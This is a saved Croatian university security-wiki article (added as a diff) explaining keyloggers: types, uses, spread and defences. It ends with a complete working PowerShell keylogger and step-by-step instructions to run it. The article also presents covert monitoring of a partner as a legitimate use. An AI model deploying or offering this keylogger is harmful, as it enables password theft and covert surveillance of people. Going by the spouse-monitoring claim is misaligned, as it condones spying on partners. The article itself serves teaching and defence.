@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Powershell Keylogger - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Powershell_Keylogger&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Powershell_Keylogger skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Powershell Keylogger</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Powershell_Keylogger.html#mw-head">orijentacija</a>,
+					<a href="Powershell_Keylogger.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Temu rezervirao: Mateo Cindrić
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Powershell_Keylogger.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Powershell_Keylogger.html#Op.C4.87enito_o_keylogger_alatima"><span class="tocnumber">2</span> <span class="toctext">Općenito o keylogger alatima</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="Powershell_Keylogger.html#Sklopovski_keylogger_alati"><span class="tocnumber">2.1</span> <span class="toctext">Sklopovski keylogger alati</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="Powershell_Keylogger.html#Programski_keylogger_alati"><span class="tocnumber">2.2</span> <span class="toctext">Programski keylogger alati</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-5"><a href="Powershell_Keylogger.html#Razlozi_za_kori.C5.A1tenje_keylogger_alata"><span class="tocnumber">3</span> <span class="toctext">Razlozi za korištenje keylogger alata</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Powershell_Keylogger.html#Na.C4.8Dini_.C5.A1irenja_keylogger_programa"><span class="tocnumber">4</span> <span class="toctext">Načini širenja keylogger programa</span></a></li>
+<li class="toclevel-1 tocsection-7"><a href="Powershell_Keylogger.html#Za.C5.A1tita_od_keylogger_programa"><span class="tocnumber">5</span> <span class="toctext">Zaštita od keylogger programa</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="Powershell_Keylogger.html#Primjer_keylogger_programa"><span class="tocnumber">6</span> <span class="toctext">Primjer keylogger programa</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="Powershell_Keylogger.html#Literatura"><span class="tocnumber">7</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Uvod"> Uvod </span></h2>
+<p><i>Keylogger</i> je naziv za program ili uređaj koji služi za praćenje unosa znakova preko tipkovnice. Ostali nazivi su <i>keystroke logger</i>, <i>key logger</i> te <i>system monitor</i>. Ti alati prate i bilježe tipke koje korisnik pritisne. Takvi alati mogu imati pozitivan učinak na sigurnost računalnog sustava, a mogu se javljati kao dodatak već instaliranim sigurnosnim programima. S druge strane mogu predstavljati veliku sigurnosnu ranjivost za individualni sustav ili cijelu računalnu mrežu. Vrlo je teško zaštititi se od napada <i>keylogger</i> alatima jer je obično nemoguće znati je li takav alat instaliran na ranjivom računalu ili nije.
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Op.C4.87enito_o_keylogger_alatima"> Općenito o keylogger alatima </span></h2>
+<p>Keylogger alati imaju za cilj pratiti unos znakova preko tipkovnice na način da se uključuju u lanac događaja između pritiska tipke na tipkovnici i prikaza znaka na ekranu. To se može postići na više načina među kojima su postavljanje video nadzora, podmetanje prislušnog uređaja na tipkovnicu ili korištenjem samog računala za presretanje unosa znakova, prepisivanjem upravljačkih programa tipkovnice te upravljačkih programa za obavljanje posebnih funkcija tipkovnice, presretanjem DLL (eng. <i>Dynamic-link library</i>) funkcija u korisničkom načinu rada ili presretanjem funkcija jezgre operacijskog sustava. <i>Keylogger</i> alati se dijele u dvije kategorije: sklopovski uređaji i programski paketi. Sklopovski uređaji su male naprave koje se postavljaju u tipkovnicu, žicu od tipkovnice ili u računalo, a programski paketi se sastoje od programa koji prate i bilježe pritiske tipke na tipkovnici. 
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Sklopovski_keylogger_alati"> Sklopovski keylogger alati </span></h3>
+<p>Riječ je o uređajima koji se stave između tipkovnice i priključka za tipkovnicu na matičnoj ploči računala. Ovaj način upotrebe keylogger uređaja zahtjeva ugradnju u tajnosti, a to napadaču može predstavljati problem, pošto je teško ugraditi takav uređaj pogotovo u prostoru u kojemu ljudi borave tijekom cijelog dana. 
+</p><p>Prednosti:
+</p>
+<ul><li>	Neovisnost o operacijskom sustavu
+</li><li>	Ne može se detektirati antivirusnim programima
+</li><li>	Jednostavna ugradnja bez tehničkog predznanja
+</li><li>	Prati se i bilježi svaki unos znakova preko tipkovnice, uključujući i zaporke za BIOS.
+</li></ul>
+<p>Nedostaci:
+</p>
+<ul><li>	Nema mogućnost zapisa vremena pritiska pojedine tipke
+</li><li>	Mali kapacitet memorije za spremanje podataka
+</li><li>	Potreban pristup sklopovlju računala.
+</li></ul>
+<p><br />
+Slika 1 prikazuje uređaj „KeyGhost SX“ sa kapacitetom memorije 2MB. Takav uređaj može pamtiti više od 2 milijuna pritiska tipki na tipkovnici te koristi 128 – bitnu enkripciju pri spremanju podataka.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:152px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Keyghost.gif" class="image"><img alt="" src="../images/7/7b/Keyghost.gif" width="150" height="87" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Keyghost.gif" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Slika 1. Primjer sklopovskog keylogger alata</div></div></div></div>
+<p><br />
+</p>
+<h3> <span class="mw-headline" id="Programski_keylogger_alati"> Programski keylogger alati </span></h3>
+<p>Za razliku od sklopovskog uređaja, <i>keylogger</i> kao programski paket za praćenje unosa znakova preko tipkovnice je program koji može pratiti i više od samih pritisaka tipki na tipkovnici. Antivirusnim alatima te drugim programskim alatima za otkrivanje sigurnosnih propusta na računalu je moguće otkriti instaliran <i>keylogger</i> program na operacijskom sustavu. 
+</p><p>Prednosti:
+</p>
+<ul><li>	Moguće ga je instalirati s udaljenog računala
+</li><li>	Teško ga je otkriti bez specijalnih programskih alata
+</li><li>	Datoteke za spremanje podataka nemaju ograničen kapacitet memorije
+</li><li>	Datoteke u koje su pohranjeni zapisi pritisaka tipki je moguće preuzeti na više načina: putem e-maila, ftp prijenosa podataka ili putem izravnog preuzimanja s računala na koji je instaliran keylogger program
+</li><li>	Uključuje i dodatne načine praćenja, npr. snimke zaslona računala
+</li><li>	Mogućnost pridruživanja datuma i vremena određenim unosima znakova preko tipkovnice.
+</li></ul>
+<p>Nedostaci:
+</p>
+<ul><li>	Da bi se program mogao instalirati, potrebne su određene ovlasti
+</li><li>	Moguće ga je otkriti pomoću antivirusnih programa i drugih sigurnosnih alata
+</li><li>	Može narušiti rad drugih programa te izazvati neočekivane pogreške
+</li><li>	Prije pokretanja operacijskog sustava ne može pamtiti pritiske tipki što znači da nije moguće zabilježiti korisničko ime ili lozinku za prijavu u sustav
+</li><li>	Za instalaciju programa su potrebni predznanje i vještina
+</li><li>	Potrebno je znati na koji će se operacijski sustav program instalirati jer postoji mogućnost da program neće raditi jer ovisi o operacijskom sustavu.
+</li></ul>
+<p>Nekoliko je načina izrade <i>keylogger</i> programa. Prva metoda je postavljanje tzv. sistemske udice (eng. <i>system hook</i>) koja presreće obavijest o pritisnutoj tipki (Kod Windows operacijskih sustava se koristi <i>WinAPI</i> metoda <i>SetWindowsHook</i>). Iduća metoda je postavljanje cikličkih zahtjeva za informacijama o događajima na tipkovnici (Kod Windows operacijskog sustava se koriste WinAPI metode <i>Get(Async)KeyState</i> ili <i>GetKeyboardState</i>.). Posljednje je korištenje upravljačkih programa za obavljanje posebnih funkcija (za izradu programa je potrebno odlično poznavanje sustava, a program se obično piše u programskom jeziku C).
+</p><p>Više o ovoj temi potražite <b><a href="http://www.cis.hr/www.edicija/LinkedDocuments/CCERT-PUBDOC-2007-11-211.pdf" class="external text" rel="nofollow">ovdje</a></b>
+</p>
+<h2> <span class="mw-headline" id="Razlozi_za_kori.C5.A1tenje_keylogger_alata"> Razlozi za korištenje keylogger alata </span></h2>
+<p>Mnogo je programskih paketa kojima administratori mogu pratiti aktivnosti zaposlenika ili pak korisnicima osobnih računala dati mogućnost praćenja aktivnosti udaljenih korisnika njihovih računala. Tanka je linija između opravdanog praćenja i špijuniranja korisnika. Legalni programi se često koriste za krađu povjerljivih korisničkih podataka, obično lozinke. Većina <i>keylogger</i> programa ili uređaja je legalna i mogu se prodavati na slobodnom tržištu. 
+</p><p>Slijedi nekoliko primjera gdje je upotreba takvih alata legalna i primjerena:
+</p>
+<ul><li>	Roditeljski nadzor – roditelji mogu pratiti što njihova djeca rade na Internetu, pogotovo pristup web stranica s neprimjerenim sadržajem
+</li><li>	Ljubomorni supružnici ili partneri – mogu pratiti svoje partnere ako ih sumnjiče za virtualno varanje
+</li><li>	Sigurnost tvrtke – ukoliko zaposlenici koriste računalo za vlastite potrebe
+</li><li>	Sigurnost (policija, vojska, zakonodavstvo) – upotreba zapisa za analizu i praćenje incidenata vezanih uz korištenje osobnih računala.
+</li></ul>
+<p>Legalni program se može koristiti i u kriminalne svrhe. Danas se obično <i>keylogger</i> alati i uređaji koriste za krađu korisničkih podataka vezanih uz web sustave za praćenje kreditnih kartica. Mnogi se <i>keylogger</i> programi skrivaju u sustavu te kao takvi imaju <i>rootkit</i> funkcionalnost.
+</p><p>Više o ovoj temi potražite <b><a href="http://www.cis.hr/www.edicija/LinkedDocuments/CCERT-PUBDOC-2007-11-211.pdf" class="external text" rel="nofollow">ovdje</a></b>
+</p>
+<h2> <span class="mw-headline" id="Na.C4.8Dini_.C5.A1irenja_keylogger_programa"> Načini širenja keylogger programa </span></h2>
+<p>Najčešći načini širenja:
+</p>
+<ul><li>instalacija prilikom otvaranja datoteke iz privitka email-a
+</li><li>instalacija prilikom pokretanja datoteke iz direktorija sa slobodnim pristupom preko P2P mreže
+</li><li>instalacija preko web stranice gdje se iskorištava propust web preglednika te se program automatski pokreće kad korisnik posjeti web stranicu
+</li><li>instalacija uz pomoć drugih zlonamjernih programa već prisutnih na ranjivom računalu
+</li></ul>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Za.C5.A1tita_od_keylogger_programa"> Zaštita od keylogger programa </span></h2>
+<p>Preporuka je instalacija antivirusnog programa budući su većina antivirusnih tvrtki već dodala poznate <i>keylogger</i> programe u svoje baze podataka te se tretiraju kao zlonamjerni programi. 
+Ovo su neke od metoda zaštite od keylogger programa:
+</p>
+<ul><li>korištenje jednokratnih lozinki ili dvokoračne autentikacije - jednokratne zaporke vrijede samo jedanput te je njihova valjanost vremenski ograničena tako da ako napadač i presretne jednokratnu zaporku, neće ju moći iskoristiti za pristup povjerljivim podacima; većina bankovnih sustava koristi generatore jednokratnih zaporki
+</li><li>korištenje sustava s proaktivnom zaštitom na klijentskoj strani koji su dizajnirani za otkrivanje <i>keylogger</i> programa te mogu upozoriti korisnika na pokušaje instalacije <i>keylogger</i> programa
+</li><li>korištenje virtualne tipkovnice - virtualna tipkovnica se prikazuje na zaslonu ekrana, a tipke se pritišću klikovima miša na određene znakove. Naime, virtualne tipkovnice i nisu baš popularne za zaštitu od <i>keylogger</i> programa, već bi ona trebala biti posebno prilagođena sprečavanju presretanja unesenih ili poslanih podataka. Na Windows 7 se nalazi na sljedećem mjestu: Start &gt; All Programs &gt; Accessories &gt; Ease of Access &gt; On-Screen Keyboard.
+</li></ul>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Virtualna_tipkovnica.png" class="image"><img alt="" src="../images/thumb/3/3d/Virtualna_tipkovnica.png/650px-Virtualna_tipkovnica.png" width="650" height="193" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Virtualna_tipkovnica.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Virtualna tipkovnica</div></div></div></div>
+<p>Više o ovoj temi potražite <b><a href="http://www.cis.hr/www.edicija/LinkedDocuments/CCERT-PUBDOC-2007-11-211.pdf" class="external text" rel="nofollow">ovdje</a></b>
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="Primjer_keylogger_programa"> Primjer keylogger programa </span></h2>
+<p>Programski kod napisan u nastavku predstavlja <i>keylogger</i> program koji je napisan u PowerShellu. Osnovi zadatak mu je pamćenje unosa znakova s tipkovnice, odnosno pritiska alfanumeričkih i specijalnih znakova na tipkovnici. Program može pamtiti velika i mala slova, brojeve, dijakritičke znakove (č, ć, ž, š i đ), znak razmaka te sve pravopisne znakove. Unesene znakove pohranjuje u horizontalnom obliku u datoteku koju sam nazvao PowerShellKeylogger.txt. Od nabrojanih metoda izrade <i>keylogger</i> programa u poglavlju 2.2, ovaj <i>keylogger</i> koristi metodu koja postavlja cikličke zahtjeve za informacijama o događajima na tipkovnici, a budući da je riječ o Windows operacijskom sustavu, koriste se WinAPI metode <i>Get(Async)KeyState</i> te <i>GetKeyboardState</i>.  
+</p>
+<pre>
+function PowerShellKeylogger($Path=&quot;$env:C\PowerShellKeylogger.txt&quot;)
+{
+
+    $virtualKeyCodeSignature = @'
+[DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern short GetAsyncKeyState(int virtualKeyCode);
+'@
+    $keyboardStateSignature = @'
+[DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+'@
+    $mapSignature = @'
+[DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+'@
+	$unicodeSignature = @'
+[DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+  $getState = Add-Type -MemberDefinition $virtualKeyCodeSignature -name &quot;Win32GetState&quot; -namespace Win32Functions -passThru
+  $getKeyboardState = Add-Type -MemberDefinition $keyboardStateSignature -name &quot;Win32MyGetKeyboardState&quot; -namespace Win32Functions -passThru
+  $getMapVirtualKey = Add-Type -MemberDefinition $mapSignature -name &quot;Win32MyMapVirtualKey&quot; -namespace Win32Functions -passThru
+  $getUnicode = Add-Type -MemberDefinition $unicodeSignature -name &quot;Win32MyToUnicode&quot; -namespace Win32Functions -passThru
+ 
+  $outputFile = New-Item -Path $Path -ItemType File -Force
+ 
+  try
+  {
+ 
+    while ($true) {
+      Start-Sleep -Milliseconds 10
+      
+      for ($asciiCode = 1; $asciiCode -le 254; $asciiCode++) {
+        $keyState = $getState::GetAsyncKeyState($asciiCode)
+ 
+        if ($keyState -eq -32767) {
+          $capsLock = [console]::CapsLock
+ 
+          $virtualKey = $getMapVirtualKey::MapVirtualKey($asciiCode, 3)
+ 
+          $kbState = New-Object Byte[] 256
+          $checkkbState = $getKeyboardState::GetKeyboardState($kbState)
+ 
+          $myChar = New-Object -TypeName &quot;System.Text.StringBuilder&quot;;
+ 
+          $result = $getUnicode::ToUnicode($asciiCode, $virtualKey, $kbState, $myChar, $myChar.Capacity, 0)
+ 
+          if ($result -gt 0)
+          {
+            [System.IO.File]::AppendAllText($Path, $myChar, [System.Text.Encoding]::Unicode)
+          }
+        }
+      }
+    }
+  }
+  finally
+  {
+    notepad $Path
+  }
+}
+ 
+PowerShellKeylogger
+</pre>
+<p>Nekoliko je načina pokretanja ovog programskog koda:
+</p><p>1. način –cmd
+</p><p>Za pokretanje programa putem cmd-a potrebno je pohraniti datoteku s kodom   (ekstenzija .ps1) na računalo. Otvorite cmd kao administrator te prvo promijenite politiku izvršavanja na 
+</p>
+<pre>powershell Set-ExecutionPolicy RemoteSigned</pre>
+<p>Potom u command promptu  doći do putanje gdje je datoteka spremljena te ju pokrenuti:
+</p>
+<pre>powershell.exe -file naziv_datoteke.ps1</pre>
+<p>2. način – Windows PowerShell  ili Windows PowerShell  ISE
+</p>
+<ul><li>1.Korak
+</li></ul>
+<p>Otvoriti Windows PowerShell (otvoriti program kao administrator)
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:413px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:1search.png" class="image"><img alt="" src="../images/e/e6/1search.png" width="411" height="626" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:1search.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Slika 2. Kako doći do Windows PowerShell-a</div></div></div></div>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Windows_PowerShell.png" class="image"><img alt="Windows PowerShell.png" src="../images/thumb/2/2e/Windows_PowerShell.png/650px-Windows_PowerShell.png" width="650" height="421" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Windows_PowerShell.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+<ul><li>2.Korak
+</li></ul>
+<p>Nakon što ste otvorili Windows PowerShell kao administrator, promijenite politiku izvršavanja unošenjem sljedeće linije:
+</p>
+<pre>Set-ExecutionPolicy RemoteSigned</pre>
+<ul><li>3.Korak
+</li></ul>
+<p>Kopirati kod i zalijepiti ga u Windows PowerShell. 
+</p><p>Sada Windows PowerShell izgleda ovako:
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Windows_PowerShell_2.png" class="image"><img alt="Windows PowerShell 2.png" src="../images/thumb/a/a2/Windows_PowerShell_2.png/650px-Windows_PowerShell_2.png" width="650" height="422" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Windows_PowerShell_2.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+<ul><li>4.Korak
+</li></ul>
+<p>Otvoriti neku aplikaciju (npr. web browser) te pritisnuti tipke na tipkovnici
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Web_browser.png" class="image"><img alt="Web browser.png" src="../images/thumb/f/f3/Web_browser.png/650px-Web_browser.png" width="650" height="122" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Web_browser.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+<ul><li>5.Korak
+</li></ul>
+<p>Po završetku, pritisnite CTRL+C kako bi se zaustavilo izvršavanje koda. 
+</p>
+<ul><li>6.Korak
+</li></ul>
+<p>Tada će se kao rezultat otvoriti datoteka u notepad-u koja ostaje pohranjena na putanji C\PowerShellKeylogger.txt
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Datoteka.png" class="image"><img alt="Datoteka.png" src="../images/thumb/b/b9/Datoteka.png/650px-Datoteka.png" width="650" height="213" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Datoteka.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+<ul><li>7.Korak 
+</li></ul>
+<p>Kao alternativu, možete otvoriti Windows PowerShell ISE te u njemu otvoriti datoteku ili kopirati kod na predviđeno mjesto. Zatim pritisnite <i>Play</i> ikonu kako bi pokrenuli skriptu. Ovakav način pokretanja će dati isti krajnji rezultat.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Windows_PowerShell_ISE.png" class="image"><img alt="Windows PowerShell ISE.png" src="../images/thumb/1/1b/Windows_PowerShell_ISE.png/650px-Windows_PowerShell_ISE.png" width="650" height="346" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Windows_PowerShell_ISE.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div></div></div></div></div>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<ol><li>CARNet CERT: Praćenje unosa znakova preko tipkovnice <a href="http://www.cis.hr/www.edicija/LinkedDocuments/CCERT-PUBDOC-2007-11-211.pdf" class="external free" rel="nofollow">http://www.cis.hr/www.edicija/LinkedDocuments/CCERT-PUBDOC-2007-11-211.pdf</a>
+</li><li>Creating a Simple Keylogger using PowerShell <a href="https://www.nextofwindows.com/creating-a-simple-keylogger-using-powershell-download" class="external free" rel="nofollow">https://www.nextofwindows.com/creating-a-simple-keylogger-using-powershell-download</a>
+</li><li>Simple Keylogger with Powershell <a href="https://www.youtube.com/watch?v=LsXQPZfvksg" class="external free" rel="nofollow">https://www.youtube.com/watch?v=LsXQPZfvksg</a>
+</li><li>How to create a simple keylogger yourself in windows <a href="http://merabheja.com/create-simple-keylogger-windows/" class="external free" rel="nofollow">http://merabheja.com/create-simple-keylogger-windows/</a> 
+</li><li>Simple Windows Keylogger using PowerShell <a href="https://gist.github.com/dasgoll/7ca1c059dd3b3fbc7277" class="external free" rel="nofollow">https://gist.github.com/dasgoll/7ca1c059dd3b3fbc7277</a>
+</li><li>First version of powershell keylogger <a href="https://github.com/vacmf/powershell-scripts/blob/master/powershell-keylogger.ps1" class="external free" rel="nofollow">https://github.com/vacmf/powershell-scripts/blob/master/powershell-keylogger.ps1</a>
+</li><li>Powershell Keylogger <a href="https://0x00sec.org/t/plug-in-to-win-powershell-keylogger-part-2-3/1158" class="external free" rel="nofollow">https://0x00sec.org/t/plug-in-to-win-powershell-keylogger-part-2-3/1158</a> 
+</li><li>Comparison Operators <a href="http://ss64.com/ps/syntax-compare.html" class="external free" rel="nofollow">http://ss64.com/ps/syntax-compare.html</a>
+</li><li>Slika 1. <a href="http://www.keyghost.com/sx/images/closeup_sx.gif" class="external free" rel="nofollow">http://www.keyghost.com/sx/images/closeup_sx.gif</a>
+</li><li>Slika 2. <a href="http://merabheja.com/create-simple-keylogger-windows/" class="external free" rel="nofollow">http://merabheja.com/create-simple-keylogger-windows/</a>
+</li></ol>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 71/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:9245-0!*!0!!hr!2!edit=0 and timestamp 20190203204206 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Powershell_Keylogger.html">http://security.foi.hr/wiki/index.php/Powershell_Keylogger</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Powershell_Keylogger" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Powershell_Keylogger.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Powershell_Keylogger&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Powershell_Keylogger.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Powershell_Keylogger.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Powershell_Keylogger&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Powershell_Keylogger&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Powershell_Keylogger.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
